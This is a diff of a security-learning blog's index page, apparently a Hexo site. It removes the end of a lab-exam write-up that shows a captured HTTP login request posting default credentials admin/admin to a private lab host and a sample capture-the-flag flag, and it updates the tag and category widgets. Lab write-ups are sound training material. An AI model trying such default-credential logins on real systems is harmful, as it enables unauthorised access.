-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.2.214:10003</span><br><span class="line">Content-Length: 29</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://192.168.2.214:10003</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.2.214:10003/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: 0350c45adcb555161a8b854c66b9ecff=104f9d1c7c5f921e0bc2588d85c27b1f</span><br><span class="line">Connection: keep-alive</span><br><span class="line">username=admin&amp;password=admin</span><br></pre></td></tr></table></figure>
-
-<p>第一次梭哈，第二次梭哈，第三次梭哈</p>
-<p><img src="/../assets/image_1734069019532_0.png" alt="image.png"></p>
-<p><code>flag&#123;hello_flag&#125;</code></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/13/week5_kls_exam/" data-id="cm5v5kurv000nftiwa20oaw5l" data-title="week5_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
     </footer>
   </div>
   
@@ -959,7 +915,7 @@
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -970,7 +926,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/changeme/">changeme</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exam/">exam</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/range/">range</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/changeme/">changeme</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exam/">exam</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/range/">range</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li></ul>
     </div>
   </div>
 
@@ -980,7 +936,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-copy-id/" rel="tag">ssh-copy-id</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sysinfo/" rel="tag">sysinfo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virt-manager/" rel="tag">virt-manager</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SqlInject/" rel="tag">SqlInject</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burpsuite/" rel="tag">burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cdn/" rel="tag">cdn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cookie/" rel="tag">cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cors/" rel="tag">cors</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/" rel="tag">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker-compose/" rel="tag">docker-compose</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/firewalld/" rel="tag">firewalld</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/get/" rel="tag">get</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/" rel="tag">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ip%E6%8E%A2%E6%B4%BB/" rel="tag">ip探活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" rel="tag">linux常见服务</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/post/" rel="tag">post</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/" rel="tag">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/review/" rel="tag">review</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/selinux/" rel="tag">selinux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/session/" rel="tag">session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/" rel="tag">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-copy-id/" rel="tag">ssh-copy-id</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sysinfo/" rel="tag">sysinfo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ufw/" rel="tag">ufw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virt-manager/" rel="tag">virt-manager</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BC%B9shell/" rel="tag">反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/" rel="tag">指纹识别</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" rel="tag">站点架构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" rel="tag">端口扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" rel="tag">虚拟化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li></ul>
     </div>
   </div>
 
@@ -990,7 +946,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/blog/" style="font-size: 20px;">blog</a> <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/ssh-copy-id/" style="font-size: 10px;">ssh-copy-id</a> <a href="/tags/ssrf/" style="font-size: 10px;">ssrf</a> <a href="/tags/sysinfo/" style="font-size: 10px;">sysinfo</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/virt-manager/" style="font-size: 10px;">virt-manager</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a>
+      <a href="/tags/SqlInject/" style="font-size: 10px;">SqlInject</a> <a href="/tags/blog/" style="font-size: 12.5px;">blog</a> <a href="/tags/burpsuite/" style="font-size: 12.5px;">burpsuite</a> <a href="/tags/cdn/" style="font-size: 10px;">cdn</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/cors/" style="font-size: 10px;">cors</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/docker-compose/" style="font-size: 12.5px;">docker-compose</a> <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/firewalld/" style="font-size: 10px;">firewalld</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/get/" style="font-size: 10px;">get</a> <a href="/tags/http/" style="font-size: 12.5px;">http</a> <a href="/tags/iptables/" style="font-size: 10px;">iptables</a> <a href="/tags/ip%E6%8E%A2%E6%B4%BB/" style="font-size: 10px;">ip探活</a> <a href="/tags/kls/" style="font-size: 20px;">kls</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" style="font-size: 10px;">linux常见服务</a> <a href="/tags/post/" style="font-size: 10px;">post</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a> <a href="/tags/review/" style="font-size: 12.5px;">review</a> <a href="/tags/selinux/" style="font-size: 10px;">selinux</a> <a href="/tags/session/" style="font-size: 10px;">session</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/smb/" style="font-size: 10px;">smb</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 17.5px;">sql注入</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/ssh-copy-id/" style="font-size: 10px;">ssh-copy-id</a> <a href="/tags/ssrf/" style="font-size: 12.5px;">ssrf</a> <a href="/tags/sysinfo/" style="font-size: 10px;">sysinfo</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/ufw/" style="font-size: 10px;">ufw</a> <a href="/tags/virt-manager/" style="font-size: 10px;">virt-manager</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/webshell/" style="font-size: 10px;">webshell</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/xss/" style="font-size: 12.5px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 15px;">信息收集</a> <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/" style="font-size: 10px;">指纹识别</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 15px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">暴力破解</a> <a href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" style="font-size: 10px;">站点架构</a> <a href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">端口扫描</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" style="font-size: 10px;">虚拟化</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10px;">计算机网络</a>
     </div>
   </div>
 
@@ -1012,6 +968,10 @@
       <ul>
         
           <li>
+            <a href="/2025/01/13/SqlInject/">SqlInject</a>
+          </li>
+        
+          <li>
             <a href="/2025/01/13/CVE-2016-4437/">CVE-2016-4437</a>
           </li>
         
@@ -1025,10 +985,6 @@
         
           <li>
             <a href="/2025/01/03/week8_kls_exam/">week8_kls_exam</a>
-          </li>
-        
-          <li>
-            <a href="/2024/12/30/ssrf-vuls/">ssrf-vuls</a>
           </li>
         
       </ul>
